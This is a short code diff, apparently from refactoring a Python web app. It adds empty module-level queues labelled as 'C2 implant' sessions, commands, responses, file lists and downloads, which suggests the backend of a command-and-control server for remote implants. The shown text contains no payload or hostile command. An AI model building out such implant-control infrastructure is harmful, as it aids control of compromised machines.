@@ -118,6 +118,16 @@ def load_php_config(path=PHP_CONFIG_PATH) -> Dict[str, Dict[str, str]]:
 CONFIG: Dict[str, Dict[str, str]] = load_php_config()
 
 
+# === C2 implant in-memory queues (verbatim from app.py:34-37, 725-726) ====
+# C2_FILE_LISTS and C2_DOWNLOADS live here too (defined inline with the file-
+# manager routes in app.py:725-726 but treated as module-level globals).
+C2_SESSIONS: Dict[str, Dict[str, Any]] = {}
+C2_COMMANDS: Dict[str, Any] = {}
+C2_RESPONSES: Dict[str, Any] = {}
+C2_FILE_LISTS: Dict[str, Any] = {}
+C2_DOWNLOADS: Dict[str, Any] = {}
+
+
 # === Notification fan-out (verbatim from app.py:344-353) ====================
 def send_notification(message_data: Dict[str, Any]) -> None:
     """Best-effort generic-webhook delivery if Settings.json has a URL."""
